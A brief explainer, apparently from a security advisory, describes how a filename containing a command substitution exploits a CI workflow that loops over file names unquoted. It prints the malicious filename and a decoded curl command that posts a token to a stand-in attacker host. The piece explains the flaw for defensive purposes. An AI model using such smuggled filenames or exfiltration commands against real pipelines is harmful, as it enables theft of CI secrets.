# Attacker Filename Payload

The attacker creates a file with a Base64-encoded payload in its name:

  documentation/rules/$(echo EXFILTRATED_TOKEN|base64 -d|bash).md

When the workflow iterates over filenames with:
  for file in ${{ steps.get_files.outputs.files }}

bash evaluates the $(...) command substitution in the filename,
decodes the base64 payload and executes it.

## Base64 payload decodes to:
  curl -s -X POST -d token=EXFILTRATED_TOKEN http://attacker-server/exfil
